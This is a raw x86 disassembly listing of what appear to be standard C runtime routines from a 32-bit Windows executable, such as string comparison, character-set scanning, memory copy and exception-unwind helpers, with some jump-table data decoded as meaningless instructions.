  427ec3:	push   DWORD PTR [esi+0x8c]
  427ec9:	call   0x42603a
  427ece:	push   DWORD PTR [esi+0x90]
  427ed4:	call   0x42603a
  427ed9:	push   DWORD PTR [esi+0x94]
  427edf:	call   0x42603a
  427ee4:	push   DWORD PTR [esi+0x98]
  427eea:	call   0x42603a
  427eef:	push   DWORD PTR [esi+0x9c]
  427ef5:	call   0x42603a
  427efa:	push   DWORD PTR [esi+0xa0]
  427f00:	call   0x42603a
  427f05:	push   DWORD PTR [esi+0xa4]
  427f0b:	call   0x42603a
  427f10:	push   DWORD PTR [esi+0xa8]
  427f16:	call   0x42603a
  427f1b:	add    esp,0x2c
  427f1e:	pop    esi
  427f1f:	ret    
  427f20:	push   esi
  427f21:	mov    esi,DWORD PTR [esp+0x8]
  427f25:	test   esi,esi
  427f27:	je     0x427f7d
  427f29:	mov    eax,DWORD PTR [esi]
  427f2b:	mov    ecx,DWORD PTR ds:0x463434
  427f31:	cmp    eax,DWORD PTR [ecx]
  427f33:	je     0x427f44
  427f35:	cmp    eax,DWORD PTR ds:0x463404
  427f3b:	je     0x427f44
  427f3d:	push   eax
  427f3e:	call   0x42603a
  427f43:	pop    ecx
  427f44:	mov    eax,DWORD PTR [esi+0x4]
  427f47:	mov    ecx,DWORD PTR ds:0x463434
  427f4d:	cmp    eax,DWORD PTR [ecx+0x4]
  427f50:	je     0x427f61
  427f52:	cmp    eax,DWORD PTR ds:0x463408
  427f58:	je     0x427f61
  427f5a:	push   eax
  427f5b:	call   0x42603a
  427f60:	pop    ecx
  427f61:	mov    esi,DWORD PTR [esi+0x8]
  427f64:	mov    eax,ds:0x463434
  427f69:	cmp    esi,DWORD PTR [eax+0x8]
  427f6c:	je     0x427f7d
  427f6e:	cmp    esi,DWORD PTR ds:0x46340c
  427f74:	je     0x427f7d
  427f76:	push   esi
  427f77:	call   0x42603a
  427f7c:	pop    ecx
  427f7d:	pop    esi
  427f7e:	ret    
  427f7f:	push   esi
  427f80:	mov    esi,DWORD PTR [esp+0x8]
  427f84:	test   esi,esi
  427f86:	je     0x428056
  427f8c:	mov    eax,DWORD PTR [esi+0xc]
  427f8f:	mov    ecx,DWORD PTR ds:0x463434
  427f95:	cmp    eax,DWORD PTR [ecx+0xc]
  427f98:	je     0x427fa9
  427f9a:	cmp    eax,DWORD PTR ds:0x463410
  427fa0:	je     0x427fa9
  427fa2:	push   eax
  427fa3:	call   0x42603a
  427fa8:	pop    ecx
  427fa9:	mov    eax,DWORD PTR [esi+0x10]
  427fac:	mov    ecx,DWORD PTR ds:0x463434
  427fb2:	cmp    eax,DWORD PTR [ecx+0x10]
  427fb5:	je     0x427fc6
  427fb7:	cmp    eax,DWORD PTR ds:0x463414
  427fbd:	je     0x427fc6
  427fbf:	push   eax
  427fc0:	call   0x42603a
  427fc5:	pop    ecx
  427fc6:	mov    eax,DWORD PTR [esi+0x14]
  427fc9:	mov    ecx,DWORD PTR ds:0x463434
  427fcf:	cmp    eax,DWORD PTR [ecx+0x14]
  427fd2:	je     0x427fe3
  427fd4:	cmp    eax,DWORD PTR ds:0x463418
  427fda:	je     0x427fe3
  427fdc:	push   eax
  427fdd:	call   0x42603a
  427fe2:	pop    ecx
  427fe3:	mov    eax,DWORD PTR [esi+0x18]
  427fe6:	mov    ecx,DWORD PTR ds:0x463434
  427fec:	cmp    eax,DWORD PTR [ecx+0x18]
  427fef:	je     0x428000
  427ff1:	cmp    eax,DWORD PTR ds:0x46341c
  427ff7:	je     0x428000
  427ff9:	push   eax
  427ffa:	call   0x42603a
  427fff:	pop    ecx
  428000:	mov    eax,DWORD PTR [esi+0x1c]
  428003:	mov    ecx,DWORD PTR ds:0x463434
  428009:	cmp    eax,DWORD PTR [ecx+0x1c]
  42800c:	je     0x42801d
  42800e:	cmp    eax,DWORD PTR ds:0x463420
  428014:	je     0x42801d
  428016:	push   eax
  428017:	call   0x42603a
  42801c:	pop    ecx
  42801d:	mov    eax,DWORD PTR [esi+0x20]
  428020:	mov    ecx,DWORD PTR ds:0x463434
  428026:	cmp    eax,DWORD PTR [ecx+0x20]
  428029:	je     0x42803a
  42802b:	cmp    eax,DWORD PTR ds:0x463424
  428031:	je     0x42803a
  428033:	push   eax
  428034:	call   0x42603a
  428039:	pop    ecx
  42803a:	mov    esi,DWORD PTR [esi+0x24]
  42803d:	mov    eax,ds:0x463434
  428042:	cmp    esi,DWORD PTR [eax+0x24]
  428045:	je     0x428056
  428047:	cmp    esi,DWORD PTR ds:0x463428
  42804d:	je     0x428056
  42804f:	push   esi
  428050:	call   0x42603a
  428055:	pop    ecx
  428056:	pop    esi
  428057:	ret    
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	push   ebp
  428061:	mov    ebp,esp
  428063:	push   esi
  428064:	xor    eax,eax
  428066:	push   eax
  428067:	push   eax
  428068:	push   eax
  428069:	push   eax
  42806a:	push   eax
  42806b:	push   eax
  42806c:	push   eax
  42806d:	push   eax
  42806e:	mov    edx,DWORD PTR [ebp+0xc]
  428071:	lea    ecx,[ecx+0x0]
  428074:	mov    al,BYTE PTR [edx]
  428076:	or     al,al
  428078:	je     0x428083
  42807a:	add    edx,0x1
  42807d:	bts    DWORD PTR [esp],eax
  428081:	jmp    0x428074
  428083:	mov    esi,DWORD PTR [ebp+0x8]
  428086:	or     ecx,0xffffffff
  428089:	lea    ecx,[ecx+0x0]
  42808c:	add    ecx,0x1
  42808f:	mov    al,BYTE PTR [esi]
  428091:	or     al,al
  428093:	je     0x42809e
  428095:	add    esi,0x1
  428098:	bt     DWORD PTR [esp],eax
  42809c:	jae    0x42808c
  42809e:	mov    eax,ecx
  4280a0:	add    esp,0x20
  4280a3:	pop    esi
  4280a4:	leave  
  4280a5:	ret    
  4280a6:	int3   
  4280a7:	int3   
  4280a8:	int3   
  4280a9:	int3   
  4280aa:	int3   
  4280ab:	int3   
  4280ac:	int3   
  4280ad:	int3   
  4280ae:	int3   
  4280af:	int3   
  4280b0:	mov    edx,DWORD PTR [esp+0x4]
  4280b4:	mov    ecx,DWORD PTR [esp+0x8]
  4280b8:	test   edx,0x3
  4280be:	jne    0x4280fc
  4280c0:	mov    eax,DWORD PTR [edx]
  4280c2:	cmp    al,BYTE PTR [ecx]
  4280c4:	jne    0x4280f4
  4280c6:	or     al,al
  4280c8:	je     0x4280f0
  4280ca:	cmp    ah,BYTE PTR [ecx+0x1]
  4280cd:	jne    0x4280f4
  4280cf:	or     ah,ah
  4280d1:	je     0x4280f0
  4280d3:	shr    eax,0x10
  4280d6:	cmp    al,BYTE PTR [ecx+0x2]
  4280d9:	jne    0x4280f4
  4280db:	or     al,al
  4280dd:	je     0x4280f0
  4280df:	cmp    ah,BYTE PTR [ecx+0x3]
  4280e2:	jne    0x4280f4
  4280e4:	add    ecx,0x4
  4280e7:	add    edx,0x4
  4280ea:	or     ah,ah
  4280ec:	jne    0x4280c0
  4280ee:	mov    edi,edi
  4280f0:	xor    eax,eax
  4280f2:	ret    
  4280f3:	nop
  4280f4:	sbb    eax,eax
  4280f6:	shl    eax,1
  4280f8:	add    eax,0x1
  4280fb:	ret    
  4280fc:	test   edx,0x1
  428102:	je     0x42811c
  428104:	mov    al,BYTE PTR [edx]
  428106:	add    edx,0x1
  428109:	cmp    al,BYTE PTR [ecx]
  42810b:	jne    0x4280f4
  42810d:	add    ecx,0x1
  428110:	or     al,al
  428112:	je     0x4280f0
  428114:	test   edx,0x2
  42811a:	je     0x4280c0
  42811c:	mov    ax,WORD PTR [edx]
  42811f:	add    edx,0x2
  428122:	cmp    al,BYTE PTR [ecx]
  428124:	jne    0x4280f4
  428126:	or     al,al
  428128:	je     0x4280f0
  42812a:	cmp    ah,BYTE PTR [ecx+0x1]
  42812d:	jne    0x4280f4
  42812f:	or     ah,ah
  428131:	je     0x4280f0
  428133:	add    ecx,0x2
  428136:	jmp    0x4280c0
  428138:	int3   
  428139:	int3   
  42813a:	int3   
  42813b:	int3   
  42813c:	int3   
  42813d:	int3   
  42813e:	int3   
  42813f:	int3   
  428140:	mov    eax,DWORD PTR [esp+0xc]
  428144:	test   eax,eax
  428146:	je     0x428192
  428148:	mov    edx,DWORD PTR [esp+0x4]
  42814c:	push   esi
  42814d:	push   edi
  42814e:	mov    esi,edx
  428150:	mov    edi,DWORD PTR [esp+0x10]
  428154:	or     edx,edi
  428156:	and    edx,0x3
  428159:	je     0x428193
  42815b:	test   eax,0x1
  428160:	je     0x428173
  428162:	mov    cl,BYTE PTR [esi]
  428164:	cmp    cl,BYTE PTR [edi]
  428166:	jne    0x4281c0
  428168:	add    esi,0x1
  42816b:	add    edi,0x1
  42816e:	sub    eax,0x1
  428171:	je     0x428190
  428173:	mov    cl,BYTE PTR [esi]
  428175:	mov    dl,BYTE PTR [edi]
  428177:	cmp    cl,dl
  428179:	jne    0x4281c0
  42817b:	mov    cl,BYTE PTR [esi+0x1]
  42817e:	mov    dl,BYTE PTR [edi+0x1]
  428181:	cmp    cl,dl
  428183:	jne    0x4281c0
  428185:	add    edi,0x2
  428188:	add    esi,0x2
  42818b:	sub    eax,0x2
  42818e:	jne    0x428173
  428190:	pop    edi
  428191:	pop    esi
  428192:	ret    
  428193:	mov    ecx,eax
  428195:	and    eax,0x3
  428198:	shr    ecx,0x2
  42819b:	je     0x4281c8
  42819d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42819f:	je     0x4281c8
  4281a1:	mov    ecx,DWORD PTR [esi-0x4]
  4281a4:	mov    edx,DWORD PTR [edi-0x4]
  4281a7:	cmp    cl,dl
  4281a9:	jne    0x4281bb
  4281ab:	cmp    ch,dh
  4281ad:	jne    0x4281bb
  4281af:	shr    ecx,0x10
  4281b2:	shr    edx,0x10
  4281b5:	cmp    cl,dl
  4281b7:	jne    0x4281bb
  4281b9:	cmp    ch,dh
  4281bb:	mov    eax,0x0
  4281c0:	sbb    eax,eax
  4281c2:	pop    edi
  4281c3:	sbb    eax,0xffffffff
  4281c6:	pop    esi
  4281c7:	ret    
  4281c8:	test   eax,eax
  4281ca:	je     0x428190
  4281cc:	mov    edx,DWORD PTR [esi]
  4281ce:	mov    ecx,DWORD PTR [edi]
  4281d0:	cmp    dl,cl
  4281d2:	jne    0x4281bb
  4281d4:	sub    eax,0x1
  4281d7:	je     0x4281f5
  4281d9:	cmp    dh,ch
  4281db:	jne    0x4281bb
  4281dd:	sub    eax,0x1
  4281e0:	je     0x4281f5
  4281e2:	and    ecx,0xff0000
  4281e8:	and    edx,0xff0000
  4281ee:	cmp    edx,ecx
  4281f0:	jne    0x4281bb
  4281f2:	sub    eax,0x1
  4281f5:	pop    edi
  4281f6:	pop    esi
  4281f7:	ret    
  4281f8:	int3   
  4281f9:	int3   
  4281fa:	int3   
  4281fb:	int3   
  4281fc:	int3   
  4281fd:	int3   
  4281fe:	int3   
  4281ff:	int3   
  428200:	push   ebp
  428201:	mov    ebp,esp
  428203:	push   edi
  428204:	push   esi
  428205:	push   ebx
  428206:	mov    ecx,DWORD PTR [ebp+0x10]
  428209:	jecxz  0x428232
  42820b:	mov    ebx,ecx
  42820d:	mov    edi,DWORD PTR [ebp+0x8]
  428210:	mov    esi,edi
  428212:	xor    eax,eax
  428214:	repnz scas al,BYTE PTR es:[edi]
  428216:	neg    ecx
  428218:	add    ecx,ebx
  42821a:	mov    edi,esi
  42821c:	mov    esi,DWORD PTR [ebp+0xc]
  42821f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428221:	mov    al,BYTE PTR [esi-0x1]
  428224:	xor    ecx,ecx
  428226:	cmp    al,BYTE PTR [edi-0x1]
  428229:	ja     0x428230
  42822b:	je     0x428232
  42822d:	sub    ecx,0x2
  428230:	not    ecx
  428232:	mov    eax,ecx
  428234:	pop    ebx
  428235:	pop    esi
  428236:	pop    edi
  428237:	leave  
  428238:	ret    
  428239:	int3   
  42823a:	int3   
  42823b:	int3   
  42823c:	int3   
  42823d:	int3   
  42823e:	int3   
  42823f:	int3   
  428240:	push   ebp
  428241:	mov    ebp,esp
  428243:	push   esi
  428244:	xor    eax,eax
  428246:	push   eax
  428247:	push   eax
  428248:	push   eax
  428249:	push   eax
  42824a:	push   eax
  42824b:	push   eax
  42824c:	push   eax
  42824d:	push   eax
  42824e:	mov    edx,DWORD PTR [ebp+0xc]
  428251:	lea    ecx,[ecx+0x0]
  428254:	mov    al,BYTE PTR [edx]
  428256:	or     al,al
  428258:	je     0x428263
  42825a:	add    edx,0x1
  42825d:	bts    DWORD PTR [esp],eax
  428261:	jmp    0x428254
  428263:	mov    esi,DWORD PTR [ebp+0x8]
  428266:	mov    edi,edi
  428268:	mov    al,BYTE PTR [esi]
  42826a:	or     al,al
  42826c:	je     0x42827a
  42826e:	add    esi,0x1
  428271:	bt     DWORD PTR [esp],eax
  428275:	jae    0x428268
  428277:	lea    eax,[esi-0x1]
  42827a:	add    esp,0x20
  42827d:	pop    esi
  42827e:	leave  
  42827f:	ret    
  428280:	push   ebp
  428281:	mov    ebp,esp
  428283:	push   ebx
  428284:	push   esi
  428285:	push   edi
  428286:	push   ebp
  428287:	push   0x0
  428289:	push   0x0
  42828b:	push   0x428298
  428290:	push   DWORD PTR [ebp+0x8]
  428293:	call   0x428d0e
  428298:	pop    ebp
  428299:	pop    edi
  42829a:	pop    esi
  42829b:	pop    ebx
  42829c:	mov    esp,ebp
  42829e:	pop    ebp
  42829f:	ret    
  4282a0:	mov    ecx,DWORD PTR [esp+0x4]
  4282a4:	test   DWORD PTR [ecx+0x4],0x6
  4282ab:	mov    eax,0x1
  4282b0:	je     0x4282c1
  4282b2:	mov    eax,DWORD PTR [esp+0x8]
  4282b6:	mov    edx,DWORD PTR [esp+0x10]
  4282ba:	mov    DWORD PTR [edx],eax
  4282bc:	mov    eax,0x3
  4282c1:	ret    
  4282c2:	push   ebx
  4282c3:	push   esi
  4282c4:	push   edi
  4282c5:	mov    eax,DWORD PTR [esp+0x10]
  4282c9:	push   eax
  4282ca:	push   0xfffffffe
  4282cc:	push   0x4282a0
  4282d1:	push   DWORD PTR fs:0x0
  4282d8:	mov    DWORD PTR fs:0x0,esp
  4282df:	mov    eax,DWORD PTR [esp+0x20]
  4282e3:	mov    ebx,DWORD PTR [eax+0x8]
  4282e6:	mov    esi,DWORD PTR [eax+0xc]
  4282e9:	cmp    esi,0xffffffff
  4282ec:	je     0x42831c
  4282ee:	cmp    esi,DWORD PTR [esp+0x24]
  4282f2:	je     0x42831c
  4282f4:	lea    esi,[esi+esi*2]
  4282f7:	mov    ecx,DWORD PTR [ebx+esi*4]
  4282fa:	mov    DWORD PTR [esp+0x8],ecx
  4282fe:	mov    DWORD PTR [eax+0xc],ecx
  428301:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428306:	jne    0x42831a
  428308:	push   0x101
  42830d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428311:	call   0x428356
  428316:	call   DWORD PTR [ebx+esi*4+0x8]
  42831a:	jmp    0x4282df
  42831c:	pop    DWORD PTR fs:0x0
  428323:	add    esp,0xc
  428326:	pop    edi
  428327:	pop    esi
  428328:	pop    ebx
  428329:	ret    
  42832a:	xor    eax,eax
  42832c:	mov    ecx,DWORD PTR fs:0x0
  428333:	cmp    DWORD PTR [ecx+0x4],0x4282a0
  42833a:	jne    0x42834c
  42833c:	mov    edx,DWORD PTR [ecx+0xc]
  42833f:	mov    edx,DWORD PTR [edx+0xc]
  428342:	cmp    DWORD PTR [ecx+0x8],edx
  428345:	jne    0x42834c
  428347:	mov    eax,0x1
  42834c:	ret    
  42834d:	push   ebx
  42834e:	push   ecx
  42834f:	mov    ebx,0x46344c
  428354:	jmp    0x428360
  428356:	push   ebx
  428357:	push   ecx
  428358:	mov    ebx,0x46344c
  42835d:	mov    ecx,DWORD PTR [ebp+0x8]
  428360:	mov    DWORD PTR [ebx+0x8],ecx
  428363:	mov    DWORD PTR [ebx+0x4],eax
  428366:	mov    DWORD PTR [ebx+0xc],ebp
  428369:	pop    ecx
  42836a:	pop    ebx
  42836b:	ret    0x4
  42836e:	int3   
  42836f:	int3   
  428370:	push   ebp
  428371:	mov    ebp,esp
  428373:	push   edi
  428374:	push   esi
  428375:	mov    esi,DWORD PTR [ebp+0xc]
  428378:	mov    ecx,DWORD PTR [ebp+0x10]
  42837b:	mov    edi,DWORD PTR [ebp+0x8]
  42837e:	mov    eax,ecx
  428380:	mov    edx,ecx
  428382:	add    eax,esi
  428384:	cmp    edi,esi
  428386:	jbe    0x428390
  428388:	cmp    edi,eax
  42838a:	jb     0x42850c
  428390:	test   edi,0x3
  428396:	jne    0x4283ac
  428398:	shr    ecx,0x2
  42839b:	and    edx,0x3
  42839e:	cmp    ecx,0x8
  4283a1:	jb     0x4283cc
  4283a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283a5:	jmp    DWORD PTR [edx*4+0x4284bc]
  4283ac:	mov    eax,edi
  4283ae:	mov    edx,0x3
  4283b3:	sub    ecx,0x4
  4283b6:	jb     0x4283c4
  4283b8:	and    eax,0x3
  4283bb:	add    ecx,eax
  4283bd:	jmp    DWORD PTR [eax*4+0x4283d0]
  4283c4:	jmp    DWORD PTR [ecx*4+0x4284cc]
  4283cb:	nop
  4283cc:	jmp    DWORD PTR [ecx*4+0x428450]
  4283d3:	nop
  4283d4:	loopne 0x428359
  4283d6:	inc    edx
  4283d7:	add    BYTE PTR [esp+eax*4],cl
  4283da:	inc    edx
  4283db:	add    BYTE PTR [eax],dh
  4283dd:	test   BYTE PTR [edx+0x0],al
  4283e0:	and    edx,ecx
  4283e2:	mov    al,BYTE PTR [esi]
  4283e4:	mov    BYTE PTR [edi],al
  4283e6:	mov    al,BYTE PTR [esi+0x1]
  4283e9:	mov    BYTE PTR [edi+0x1],al
  4283ec:	mov    al,BYTE PTR [esi+0x2]
  4283ef:	shr    ecx,0x2
  4283f2:	mov    BYTE PTR [edi+0x2],al
  4283f5:	add    esi,0x3
  4283f8:	add    edi,0x3
  4283fb:	cmp    ecx,0x8
  4283fe:	jb     0x4283cc
  428400:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428402:	jmp    DWORD PTR [edx*4+0x4284bc]
  428409:	lea    ecx,[ecx+0x0]
  42840c:	and    edx,ecx
  42840e:	mov    al,BYTE PTR [esi]
  428410:	mov    BYTE PTR [edi],al
  428412:	mov    al,BYTE PTR [esi+0x1]
  428415:	shr    ecx,0x2
  428418:	mov    BYTE PTR [edi+0x1],al
  42841b:	add    esi,0x2
  42841e:	add    edi,0x2
  428421:	cmp    ecx,0x8
  428424:	jb     0x4283cc
  428426:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428428:	jmp    DWORD PTR [edx*4+0x4284bc]
  42842f:	nop
  428430:	and    edx,ecx
  428432:	mov    al,BYTE PTR [esi]
  428434:	mov    BYTE PTR [edi],al
  428436:	add    esi,0x1
  428439:	shr    ecx,0x2
  42843c:	add    edi,0x1
  42843f:	cmp    ecx,0x8
  428442:	jb     0x4283cc
  428444:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428446:	jmp    DWORD PTR [edx*4+0x4284bc]
  42844d:	lea    ecx,[ecx+0x0]
  428450:	mov    bl,0x84
  428452:	inc    edx
  428453:	add    BYTE PTR [eax-0x67ffbd7c],ah
  428459:	test   BYTE PTR [edx+0x0],al
  42845c:	nop
  42845d:	test   BYTE PTR [edx+0x0],al
  428460:	mov    BYTE PTR [edx+eax*2+0x42848000],al
  428467:	add    BYTE PTR [eax-0x7c],bh
  42846a:	inc    edx
  42846b:	add    BYTE PTR [eax-0x7c],dh
  42846e:	inc    edx
  42846f:	add    BYTE PTR [ebx-0x761b71bc],cl
  428475:	inc    esp
  428476:	(bad)  
  428477:	in     al,0x8b
  428479:	inc    esp
  42847a:	mov    gs,eax
  42847c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  428480:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  428484:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  428488:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42848c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  428490:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  428494:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  428498:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42849c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4284a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4284a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4284a8:	lea    eax,[ecx*4+0x0]
  4284af:	add    esi,eax
  4284b1:	add    edi,eax
  4284b3:	jmp    DWORD PTR [edx*4+0x4284bc]
  4284ba:	mov    edi,edi
  4284bc:	int3   
  4284bd:	test   BYTE PTR [edx+0x0],al
  4284c0:	aam    0x84
  4284c2:	inc    edx
  4284c3:	add    al,ah
  4284c5:	test   BYTE PTR [edx+0x0],al
  4284c8:	hlt    
  4284c9:	test   BYTE PTR [edx+0x0],al
  4284cc:	mov    eax,DWORD PTR [ebp+0x8]
  4284cf:	pop    esi
  4284d0:	pop    edi
  4284d1:	leave  
  4284d2:	ret    
  4284d3:	nop
  4284d4:	mov    al,BYTE PTR [esi]
  4284d6:	mov    BYTE PTR [edi],al
  4284d8:	mov    eax,DWORD PTR [ebp+0x8]
  4284db:	pop    esi
  4284dc:	pop    edi
  4284dd:	leave  
  4284de:	ret    
  4284df:	nop
  4284e0:	mov    al,BYTE PTR [esi]
  4284e2:	mov    BYTE PTR [edi],al
  4284e4:	mov    al,BYTE PTR [esi+0x1]
  4284e7:	mov    BYTE PTR [edi+0x1],al
  4284ea:	mov    eax,DWORD PTR [ebp+0x8]
  4284ed:	pop    esi
  4284ee:	pop    edi
  4284ef:	leave  
  4284f0:	ret    
  4284f1:	lea    ecx,[ecx+0x0]
  4284f4:	mov    al,BYTE PTR [esi]
  4284f6:	mov    BYTE PTR [edi],al
  4284f8:	mov    al,BYTE PTR [esi+0x1]
  4284fb:	mov    BYTE PTR [edi+0x1],al
  4284fe:	mov    al,BYTE PTR [esi+0x2]
  428501:	mov    BYTE PTR [edi+0x2],al
  428504:	mov    eax,DWORD PTR [ebp+0x8]
  428507:	pop    esi
  428508:	pop    edi
  428509:	leave  
  42850a:	ret    
  42850b:	nop
  42850c:	lea    esi,[ecx+esi*1-0x4]
  428510:	lea    edi,[ecx+edi*1-0x4]
  428514:	test   edi,0x3
  42851a:	jne    0x428540
  42851c:	shr    ecx,0x2
  42851f:	and    edx,0x3
  428522:	cmp    ecx,0x8
  428525:	jb     0x428534
  428527:	std    
  428528:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42852a:	cld    
  42852b:	jmp    DWORD PTR [edx*4+0x428658]
  428532:	mov    edi,edi
  428534:	neg    ecx
  428536:	jmp    DWORD PTR [ecx*4+0x428608]
  42853d:	lea    ecx,[ecx+0x0]
  428540:	mov    eax,edi
  428542:	mov    edx,0x3
  428547:	cmp    ecx,0x4
  42854a:	jb     0x428558
  42854c:	and    eax,0x3
  42854f:	sub    ecx,eax
  428551:	jmp    DWORD PTR [eax*4+0x42855c]
  428558:	jmp    DWORD PTR [ecx*4+0x428658]
  42855f:	nop
  428560:	ins    BYTE PTR es:[edi],dx
  428561:	test   DWORD PTR [edx+0x0],eax
  428564:	nop
  428565:	test   DWORD PTR [edx+0x0],eax
  428568:	mov    eax,0x8a004285
  42856d:	inc    esi
  42856e:	add    esp,DWORD PTR [ebx]
  428570:	ror    DWORD PTR [eax-0x117cfcb9],1
  428576:	add    ecx,eax
  428578:	jmp    0x232087f
  42857d:	cmp    ecx,0x8
  428580:	jb     0x428534
  428582:	std    
  428583:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428585:	cld    
  428586:	jmp    DWORD PTR [edx*4+0x428658]
  42858d:	lea    ecx,[ecx+0x0]
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	and    edx,ecx
  428595:	mov    BYTE PTR [edi+0x3],al
  428598:	mov    al,BYTE PTR [esi+0x2]
  42859b:	shr    ecx,0x2
  42859e:	mov    BYTE PTR [edi+0x2],al
  4285a1:	sub    esi,0x2
  4285a4:	sub    edi,0x2
  4285a7:	cmp    ecx,0x8
  4285aa:	jb     0x428534
  4285ac:	std    
  4285ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285af:	cld    
  4285b0:	jmp    DWORD PTR [edx*4+0x428658]
  4285b7:	nop
  4285b8:	mov    al,BYTE PTR [esi+0x3]
  4285bb:	and    edx,ecx
  4285bd:	mov    BYTE PTR [edi+0x3],al
  4285c0:	mov    al,BYTE PTR [esi+0x2]
  4285c3:	mov    BYTE PTR [edi+0x2],al
  4285c6:	mov    al,BYTE PTR [esi+0x1]
  4285c9:	shr    ecx,0x2
  4285cc:	mov    BYTE PTR [edi+0x1],al
  4285cf:	sub    esi,0x3
  4285d2:	sub    edi,0x3
  4285d5:	cmp    ecx,0x8
  4285d8:	jb     0x428534
  4285de:	std    
  4285df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285e1:	cld    
  4285e2:	jmp    DWORD PTR [edx*4+0x428658]
  4285e9:	lea    ecx,[ecx+0x0]
  4285ec:	or     al,0x86
  4285ee:	inc    edx
  4285ef:	add    BYTE PTR [esi+eax*4],dl
  4285f2:	inc    edx
  4285f3:	add    BYTE PTR [esi+eax*4],bl
  4285f6:	inc    edx
  4285f7:	add    BYTE PTR [esi+eax*4],ah
  4285fa:	inc    edx
  4285fb:	add    BYTE PTR [esi+eax*4],ch
  4285fe:	inc    edx
  4285ff:	add    BYTE PTR [esi+eax*4],dh
  428602:	inc    edx
  428603:	add    BYTE PTR [esi+eax*4],bh
  428606:	inc    edx
  428607:	add    BYTE PTR [edi-0x7a],cl
  42860a:	inc    edx
  42860b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428611:	inc    esp
  428612:	(bad)  
  428613:	sbb    al,0x8b
  428615:	inc    esp
  428616:	mov    ds,WORD PTR [eax]
  428618:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42861c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428620:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428624:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428628:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42862c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428630:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428634:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428638:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42863c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428640:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428644:	lea    eax,[ecx*4+0x0]
  42864b:	add    esi,eax
  42864d:	add    edi,eax
  42864f:	jmp    DWORD PTR [edx*4+0x428658]
  428656:	mov    edi,edi
  428658:	push   0x70004286
  42865d:	xchg   BYTE PTR [edx+0x0],al
  428660:	add    BYTE PTR [esi-0x796bffbe],0x42
  428667:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42866d:	leave  
  42866e:	ret    
  42866f:	nop
  428670:	mov    al,BYTE PTR [esi+0x3]
  428673:	mov    BYTE PTR [edi+0x3],al
  428676:	mov    eax,DWORD PTR [ebp+0x8]
  428679:	pop    esi
  42867a:	pop    edi
  42867b:	leave  
  42867c:	ret    
  42867d:	lea    ecx,[ecx+0x0]
  428680:	mov    al,BYTE PTR [esi+0x3]
  428683:	mov    BYTE PTR [edi+0x3],al
  428686:	mov    al,BYTE PTR [esi+0x2]
  428689:	mov    BYTE PTR [edi+0x2],al
  42868c:	mov    eax,DWORD PTR [ebp+0x8]
  42868f:	pop    esi
  428690:	pop    edi
  428691:	leave  
  428692:	ret    
  428693:	nop
  428694:	mov    al,BYTE PTR [esi+0x3]
  428697:	mov    BYTE PTR [edi+0x3],al
  42869a:	mov    al,BYTE PTR [esi+0x2]
  42869d:	mov    BYTE PTR [edi+0x2],al
  4286a0:	mov    al,BYTE PTR [esi+0x1]
  4286a3:	mov    BYTE PTR [edi+0x1],al
  4286a6:	mov    eax,DWORD PTR [ebp+0x8]
  4286a9:	pop    esi
  4286aa:	pop    edi
  4286ab:	leave  
  4286ac:	ret    
  4286ad:	push   ebp
  4286ae:	mov    ebp,esp
  4286b0:	sub    esp,0xc
  4286b3:	mov    eax,ds:0x462f30
  4286b8:	xor    eax,DWORD PTR [ebp+0x4]
  4286bb:	and    BYTE PTR [ebp-0x6],0x0
  4286bf:	push   0x6
  4286c1:	mov    DWORD PTR [ebp-0x4],eax
  4286c4:	lea    eax,[ebp-0xc]
  4286c7:	push   eax
  4286c8:	push   0x1004
  4286cd:	push   DWORD PTR [ebp+0x8]
  4286d0:	call   DWORD PTR ds:0x429138
  4286d6:	test   eax,eax
  4286d8:	jne    0x4286df
  4286da:	or     eax,0xffffffff
  4286dd:	jmp    0x4286e9
  4286df:	lea    eax,[ebp-0xc]
  4286e2:	push   eax
  4286e3:	call   0x4289ee
  4286e8:	pop    ecx
  4286e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4286ec:	xor    ecx,DWORD PTR [ebp+0x4]
  4286ef:	call   0x425afc
  4286f4:	leave  
  4286f5:	ret    
  4286f6:	push   0x38
  4286f8:	push   0x42a000
  4286fd:	call   0x425434
  428702:	mov    eax,ds:0x462f30
  428707:	xor    eax,DWORD PTR [ebp+0x4]
  42870a:	mov    DWORD PTR [ebp-0x1c],eax
  42870d:	xor    edi,edi
